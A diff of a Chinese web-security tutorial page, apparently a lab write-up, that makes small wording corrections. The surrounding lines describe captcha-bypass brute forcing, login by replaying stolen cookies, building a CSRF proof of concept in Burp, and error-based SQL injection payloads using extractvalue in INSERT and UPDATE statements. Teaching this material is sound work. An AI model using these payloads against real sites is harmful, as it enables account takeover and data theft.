@@ -428,7 +428,7 @@
 </h3><p>虽然服务端会生成验证码，但是我们可以利用验证码的生命时长来重复利用一个验证码。</p>
 <p>所以直接抓包对密码部分进行字典爆破即可。</p>
 <h3 id="验证码绕过on-client">验证码绕过(on client)
-</h3><p>客户端验证密码的防护能力约等于没有，所以哪怕你直接把数据包里<code>vscode=xxx</code>的部分删除直接爆破密码也可以</p>
+</h3><p>客户端验证验证码的防护能力约等于没有，所以哪怕你直接把数据包里<code>vscode=xxx</code>的部分删除直接爆破密码也可以</p>
 <h3 id="token验证重点">token验证（重点）
 </h3><blockquote>
 <p><strong>特点：</strong></p>
@@ -518,7 +518,7 @@
 <p>黑客访问这个后端网址时使用burp抓包，将刚才的cookie替换进去即可免密登录后台。</p>
 <h2 id="csrf跨站攻击">CSRF跨站攻击
 </h2><p>CSRF通常用于在用户不知情的情况下修改其信息，例如您根据某个网站修改个人信息的页面的表单写一段代码并隐藏在您自己的网站中（例如点击“点我中奖”后会向原网站提交修改用户名的表单），使用一些手段诱导用户访问您的网站并点击按钮，好处是利用用户自己的cookie从而绕过身份验证。</p>
-<p>不过现在您不用再手写隐藏表单，您可以在提交个人信息的界面用burp抓包，右键后点击 <strong>Engagement tools</strong>&ndash;**Generate CSRF Poc **一键生成后复制html代码到本地自行修改。</p>
+<p>不过现在您不用再手写隐藏表单，您可以在提交个人信息的界面用burp抓包，右键后点击 <strong>Engagement tools</strong>&ndash; **Generate CSRF Poc ** 一键生成后复制html代码到本地自行修改。</p>
 <p>例如下面这段代码将会使得用户在点击按钮后性别被修改为直升机。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -602,7 +602,7 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">猜测insert语句：
 </span></span><span class="line"><span class="cl">insert into table1(username,password,sex,phone,email,addr)values(&#39;用户名&#39;,&#39;密码&#39;,&#39;性别&#39;,&#39;地址&#39;,&#39;住址&#39;)
-</span></span><span class="line"><span class="cl">插入payload（注意使用了括号绕过，管道符包裹内）：
+</span></span><span class="line"><span class="cl">插入payload（注意使用了括号绕过，管道符包裹部分）：
 </span></span><span class="line"><span class="cl">insert into table1(username,password,sex,phone,email,addr)values(&#39;用户名&#39;,&#39;密码&#39;,&#39;性别&#39;,&#39;地址&#39;,&#39; |x &#39; and extractvalue(1,concat(0x7e,(database()),0x7e))) #|  &#39;)
 </span></span></code></pre></td></tr></table>
 </div>
@@ -618,7 +618,7 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">猜测update语句：
 </span></span><span class="line"><span class="cl">update table1 set sex=&#39;11&#39;,phone=&#39;22&#39;,email=&#39;33&#39;,addr=&#39;44&#39; where username=&#39;retr0&#39;
-</span></span><span class="line"><span class="cl">插入payload（管道符包裹内）：
+</span></span><span class="line"><span class="cl">插入payload（管道符包裹部分）：
 </span></span><span class="line"><span class="cl">update table1 set sex=&#39;11&#39;,phone=&#39;22&#39;,email=&#39;33&#39;,addr=&#39;|44&#39; and extractvalue(1,concat(0x7e,(database()),0x7e)) or &#39;1&#39;=&#39;1 &#39;| where username=&#39;retr0&#39;
 </span></span></code></pre></td></tr></table>
 </div>
